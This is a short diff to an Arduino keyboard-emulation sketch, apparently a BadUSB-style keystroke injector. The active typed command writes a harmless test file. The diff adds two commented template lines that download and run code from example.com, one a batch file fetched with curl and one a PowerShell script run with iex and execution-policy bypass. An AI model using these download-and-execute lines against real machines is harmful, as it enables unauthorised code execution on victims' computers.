@@ -22,6 +22,10 @@ void setup() {
     delay(1000);
 
     // One-liner command here
+    // For bat files use:
+    // cmd /c "curl -o %temp%\x.bat http://example.com/x.bat & %temp%\x.bat"
+    // For powershell (compatible with older versions):
+    // powershell -exec bypass -c "iex (iwr http://example.com/script.ps1)"
     Keyboard.print("echo Arduino test > %USERPROFILE%\\Downloads\\arduino_test.txt && exit");
     Keyboard.write(KEY_RETURN);
 
